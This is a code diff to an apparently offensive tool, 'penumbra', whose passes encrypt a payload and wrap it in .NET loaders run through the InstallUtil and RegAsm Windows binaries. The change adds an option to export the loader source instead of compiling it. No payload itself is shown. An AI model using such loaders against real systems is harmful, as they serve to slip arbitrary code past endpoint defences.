@@ -174,7 +174,7 @@ class InstallUtilPass:
         return "lolbas-installutil"
 
     def apply(self, data: bytes, config: PassConfig) -> bytes:
-        return _build_lolbas(data, "installutil")
+        return _build_lolbas(data, "installutil", config)
 
 
 class RegAsmPass:
@@ -187,21 +187,28 @@ class RegAsmPass:
         return "lolbas-regasm"
 
     def apply(self, data: bytes, config: PassConfig) -> bytes:
-        return _build_lolbas(data, "regasm")
+        return _build_lolbas(data, "regasm", config)
 
 
-
-def _build_lolbas(data: bytes, fmt: str) -> bytes:
-    """Build a LOLBAS project and return compiled bytes."""
-    if not shutil.which("dotnet"):
-        raise RuntimeError("dotnet SDK not found. Install .NET 8+ SDK.")
-
+def _build_lolbas(data: bytes, fmt: str, config: PassConfig) -> bytes:
+    """Build a LOLBAS project and return compiled bytes (or export source)."""
     payload_b64, key_b64 = encrypt_and_encode(data)
     tmp_dir = tempfile.mkdtemp(prefix=f"penumbra_lolbas_{fmt}_")
     tmp_path = Path(tmp_dir)
 
     try:
         _GENERATORS[fmt](payload_b64, key_b64, tmp_path)
+
+        if config.extra.get("source"):
+            from penumbra.dotnet._loader_utils import export_source_project
+
+            output_dir = Path(str(config.extra.get("source_output", tmp_path)))
+            export_source_project(tmp_path, output_dir)
+            return b""
+
+        if not shutil.which("dotnet"):
+            raise RuntimeError("dotnet SDK not found. Install .NET 8+ SDK.")
         return compile_dotnet_project(tmp_path, "net472")
     finally:
-        shutil.rmtree(tmp_dir, ignore_errors=True)
+        if not config.extra.get("source"):
+            shutil.rmtree(tmp_dir, ignore_errors=True)
